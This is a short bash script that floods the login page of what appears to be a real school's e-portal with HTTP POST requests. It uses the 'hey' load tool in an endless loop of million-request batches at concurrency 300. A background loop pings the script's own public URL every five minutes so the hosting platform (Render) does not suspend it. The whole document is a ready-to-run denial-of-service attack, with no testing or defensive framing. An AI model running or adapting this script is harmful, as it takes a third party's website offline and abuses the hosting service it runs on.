#!/bin/bash
TARGET="https://eportal.mabest-academy.com/login.php"
BODY="/app/login.txt"
C="${CONCURRENCY:-300}"
SELF_URL="${RENDER_EXTERNAL_URL:-http://localhost:10000}"

echo "[$(date)] Flood starting. C=$C Self=$SELF_URL"

# Keep-alive: ping our own public URL every 5 min so Render doesn't sleep us
( while true; do
    sleep 300
    curl -s -o /dev/null "$SELF_URL" && echo "[$(date)] keepalive ok"
  done ) &

# Main flood loop
while true; do
  hey -n 1000000 -c $C -m POST -T "application/x-www-form-urlencoded" -D "$BODY" "$TARGET"
  echo "[$(date)] batch done, restarting"
  sleep 1
done